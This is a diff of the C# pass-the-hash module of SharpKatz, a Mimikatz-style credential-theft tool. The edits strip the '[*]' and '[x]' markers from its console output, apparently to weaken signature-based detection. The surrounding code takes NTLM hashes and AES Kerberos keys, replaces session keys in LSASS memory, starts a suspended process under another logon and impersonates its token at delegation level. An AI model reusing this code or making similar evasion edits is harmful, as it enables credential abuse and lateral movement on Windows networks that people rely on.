@@ -51,13 +51,13 @@ namespace SharpKatz.Module
             {
                 if (string.IsNullOrEmpty(user))
                 {
-                    Console.WriteLine("[x] Missing required parameter user");
+                    Console.WriteLine("   Missing required parameter user");
                     return 1;
                 }
 
                 if (string.IsNullOrEmpty(domain))
                 {
-                    Console.WriteLine("[x] Missing required parameter domain");
+                    Console.WriteLine("   Missing required parameter domain");
                     return 1;
                 }
 
@@ -66,10 +66,10 @@ namespace SharpKatz.Module
                 else
                     lcommand = binary;
 
-                Console.WriteLine("[*] user\t: {0}", user);
-                Console.WriteLine("[*] domain\t: {0}", domain);
-                Console.WriteLine("[*] program\t: {0}", lcommand);
-                Console.WriteLine("[*] impers.\t: {0}", impersonate);
+                Console.WriteLine("   user\t: {0}", user);
+                Console.WriteLine("   domain\t: {0}", domain);
+                Console.WriteLine("   program\t: {0}", lcommand);
+                Console.WriteLine("   impers.\t: {0}", impersonate);
             }
 
             try
@@ -83,14 +83,14 @@ namespace SharpKatz.Module
 
                     data.Aes128Key = aes128bytes;
 
-                    Console.WriteLine("[*] AES128\t: {0}", Utility.PrintHexBytes(aes128bytes));
+                    Console.WriteLine("   AES128\t: {0}", Utility.PrintHexBytes(aes128bytes));
                 }
 
                 
             }
             catch (Exception)
             {
-                Console.WriteLine("[x] Invalid aes128 key");
+                Console.WriteLine("   Invalid aes128 key");
                 return 1;
             }
                         
@@ -105,14 +105,14 @@ namespace SharpKatz.Module
 
                     data.Aes256Key = aes256bytes;
 
-                    Console.WriteLine("[*] AES256\t: {0}", Utility.PrintHexBytes(aes256bytes));
+                    Console.WriteLine("   AES256\t: {0}", Utility.PrintHexBytes(aes256bytes));
                 }
 
                 
             }
             catch (Exception)
             {
-                Console.WriteLine("[x] Invalid aes128 key");
+                Console.WriteLine("   Invalid aes128 key");
                 return 1;
             }
 
@@ -129,11 +129,11 @@ namespace SharpKatz.Module
 
                 data.NtlmHash = ntlmHashbytes;
 
-                Console.WriteLine("[*] NTLM\t: {0}", Utility.PrintHashBytes(ntlmHashbytes));
+                Console.WriteLine("   NTLM\t: {0}", Utility.PrintHashBytes(ntlmHashbytes));
             }
             catch (Exception)
             {
-                Console.WriteLine("[x] Invalid Ntlm hash/rc4 key");
+                Console.WriteLine("   Invalid Ntlm hash/rc4 key");
                 return 1;
             }
 
@@ -141,7 +141,7 @@ namespace SharpKatz.Module
             {
                 if (!string.IsNullOrEmpty(luid))
                 {
-                    Console.WriteLine("[*] mode\t: replacing NTLM/RC4 key in a session");
+                    Console.WriteLine("   mode\t: replacing NTLM/RC4 key in a session");
                     Pth_luid(hProcess, lsasrvMem, kerberos, oshelper, iv, aeskey, deskey, ref data);
                 }
                 else if(!string.IsNullOrEmpty(user))
@@ -149,8 +149,8 @@ namespace SharpKatz.Module
                     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                     if(CreateProcessWithLogonW(user, "", domain, @"C:\Windows\System32\", binary, arguments, CreationFlags.CREATE_SUSPENDED, ref pi))
                     {
-                        Console.WriteLine("[*]  | PID {0}", pi.dwProcessId);
-                        Console.WriteLine("[*]  | TID {0}", pi.dwThreadId);
+                        Console.WriteLine("    | PID {0}", pi.dwProcessId);
+                        Console.WriteLine("    | TID {0}", pi.dwThreadId);
 
                         IntPtr hToken = IntPtr.Zero;
 
@@ -178,17 +178,17 @@ namespace SharpKatz.Module
                                         if (DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ref at, (int)SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, (int)TOKEN_TYPE.TokenImpersonation, ref hNewToken))
                                         {
                                             if (SetThreadToken(IntPtr.Zero, hNewToken))
-                                                Console.WriteLine("[*] ** Token Impersonation **");
+                                                Console.WriteLine("   ** Token Impersonation **");
                                             else
                                             {
-                                                Console.WriteLine("[x] Error SetThreadToken");
+                                                Console.WriteLine("   Error SetThreadToken");
                                                 return 1;
                                             }
                                             CloseHandle(hNewToken);
                                         }
                                         else
                                         {
-                                            Console.WriteLine("[x] Error DuplicateTokenEx");
+                                            Console.WriteLine("   Error DuplicateTokenEx");
                                             return 1;
                                         }
 
@@ -203,31 +203,31 @@ namespace SharpKatz.Module
                             }
                             else
                             {
-                                Console.WriteLine("[x] Error GetTokenInformazion");
+                                Console.WriteLine("   Error GetTokenInformazion");
                                 return 1;
                             }
                         }
                         else
                         {
-                            Console.WriteLine("[x] Error open process");
+                            Console.WriteLine("   Error open process");
                             return 1;
                         }
                     }
                     else
                     {
-                        Console.WriteLine("[x] Error process create");
+                        Console.WriteLine("   Error process create");
                         return 1;
                     }
                 }
                 else
                 {
-                    Console.WriteLine("[x] Bad user or LUID");
+                    Console.WriteLine("   Bad user or LUID");
                     return 1;
                 }
             }
             else
             {
-                Console.WriteLine("[x] Missing at least one argument : ntlm/rc4 OR aes128 OR aes256");
+                Console.WriteLine("   Missing at least one argument : ntlm/rc4 OR aes128 OR aes256");
                 return 1;
             }
 
@@ -240,7 +240,7 @@ namespace SharpKatz.Module
             List<Logon> logonlist = new List<Logon>();
             Module.LogonSessions.FindCredentials(hProcess, lsasrvMem, oshelper, iv, aeskey, deskey, logonlist);
 
-            Console.WriteLine("[*]  |  LUID {0} ; {1} ({2:X}:{3:X})", data.LogonId.HighPart, data.LogonId.LowPart, data.LogonId.HighPart, data.LogonId.LowPart);
+            Console.WriteLine("    |  LUID {0} ; {1} ({2:X}:{3:X})", data.LogonId.HighPart, data.LogonId.LowPart, data.LogonId.HighPart, data.LogonId.LowPart);
 
             Module.Msv1.WriteMsvCredentials(hProcess, oshelper, iv, aeskey, deskey, logonlist, ref data);
 
@@ -251,7 +251,7 @@ namespace SharpKatz.Module
                Module.Kerberos.WriteKerberosKeys(ref hProcess, s, oshelper, iv, aeskey, deskey, ref data);
             }
             
-            Console.WriteLine("[*]");
+            Console.WriteLine("  ");
         }
 
         public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
